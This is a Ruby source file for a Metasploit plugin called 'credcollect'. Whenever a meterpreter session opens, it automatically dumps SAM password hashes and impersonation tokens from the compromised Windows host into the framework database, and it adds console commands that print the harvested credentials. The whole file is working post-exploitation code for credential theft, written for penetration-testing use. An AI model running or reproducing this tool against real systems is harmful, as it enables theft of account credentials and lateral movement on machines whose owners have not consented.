# credcollect - tebo[at]attackresearch.com
module Msf

class Plugin::CredCollect < Msf::Plugin
	include Msf::SessionEvent

	class CredCollectCommandDispatcher
		include Msf::Ui::Console::CommandDispatcher

		def name
			"credcollect"
		end

		def commands
			{
				"db_hashes" => "Dumps hashes collected in the database",
				"db_tokens" => "Dumps tokens collected in the database with host information"
			}
		end

		def cmd_db_hashes()
			framework.db.each_note do |note|
				if note.ntype == "auth_HASH"
					print_line(note.data)
				end
			end
		end
		
		def cmd_db_tokens()
			framework.db.each_note do |note|
				if note.ntype == "auth_TOKEN"
					print_line("#{note.host.address} - #{note.data}")
				end
			end
		end
	end

	def on_session_open(session)
	
		return if not self.framework.db.active
		
		print_status("This is CredCollect, I have the conn!")
		
		if (session.type == "meterpreter")
			
			# Make sure we're rockin Priv and Incognito
			session.core.use("priv")
			session.core.use("incognito")

			# It wasn't me mom! Stinko did it!
			hashes = session.priv.sam_hashes
			
			# Target infos for the db record
			addr = session.sock.peerhost
			host = self.framework.db.report_host_state(self, addr, Msf::HostState::Alive)

			# Record hashes to the running db instance as auth_HASH type
			hashes.each do |user|

				type = "auth_HASH"
				data = user.to_s

				# We'll make this look like an auth note anyway
				self.framework.db.get_note(self, host, type, data)
			end
			
			# Record user tokens
			tokens = session.incognito.incognito_list_tokens(0).values
			# Meh, tokens come to us as a formatted string
			tokens = tokens.to_s.strip!.split("\n")

			tokens.each do |token|
				type = "auth_TOKEN"
				data = token

				self.framework.db.get_note(self, host, type, data)
			end
		end
	end

	def on_session_close(session)
	end

	def initialize(framework, opts)
		super
		self.framework.events.add_session_subscriber(self)
		add_console_dispatcher(CredCollectCommandDispatcher)
	end

	def cleanup
		self.framework.events.remove_session_subscriber(self)
		remove_console_dispatcher('credcollect')
	end

	def name
		"credcollect"
	end

	def desc
		"Automatically grabs hashes and tokens from meterpreter session events and stores them in the db"
	end

end
end
